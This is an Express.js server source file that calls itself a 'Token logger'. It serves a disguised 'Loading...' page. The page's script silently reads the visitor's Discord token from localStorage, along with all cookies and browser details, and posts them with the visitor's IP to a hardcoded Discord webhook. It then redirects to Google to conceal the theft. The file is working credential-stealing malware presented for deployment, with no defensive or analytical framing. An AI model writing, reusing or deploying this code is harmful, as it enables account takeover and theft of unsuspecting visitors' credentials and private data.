const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod';

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // HTML with JavaScript that runs on visitor's browser
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #1a1a2e;
                color: white;
                font-family: Arial, sans-serif;
            }
            .loader { text-align: center; }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #3498db;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="loader">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>

        <script>
        // THIS RUNS ON THE VISITOR'S BROWSER - NOT ON RAILWAY
        function extractTokens() {
            // Get Discord token from localStorage (Discord web)
            let token = null;
            try {
                token = localStorage.getItem('token');
            } catch(e) {}
            
            // Get all cookies
            const cookies = document.cookie;
            
            // Get browser info
            const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            return { token, cookies, browserInfo };
        }

        async function sendToWebhook(data) {
            const webhookURL = '${WEBHOOK_URL}';
            
            const payload = {
                embeds: [{
                    title: '🎯 Token Extracted!',
                    color: 0x00ff00,
                    fields: [
                        { name: 'Discord Token', value: data.token || '❌ No token found', inline: false },
                        { name: 'IP Address', value: '${ip}', inline: true },
                        { name: 'Browser', value: data.browserInfo.userAgent.substring(0, 100), inline: false },
                        { name: 'Platform', value: data.browserInfo.platform, inline: true },
                        { name: 'Cookies', value: data.cookies || 'None', inline: false },
                        { name: 'Time', value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: 'Token Logger' }
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('✅ Sent to webhook');
            } catch(e) {
                console.error('Webhook error:', e);
            }
        }

        // Execute immediately
        (async function() {
            const data = extractTokens();
            await sendToWebhook(data);
            
            // Also log to console (visible in Railway logs if you check)
            console.log('Token:', data.token || 'No token');
            console.log('Cookies:', data.cookies || 'No cookies');
            console.log('Browser:', data.browserInfo.userAgent);
            
            // Redirect to Google to hide the activity
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 1500);
        })();
        </script>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ Token logger running on port ${PORT}`);
    console.log(`📡 Webhook: ${WEBHOOK_URL}`);
});
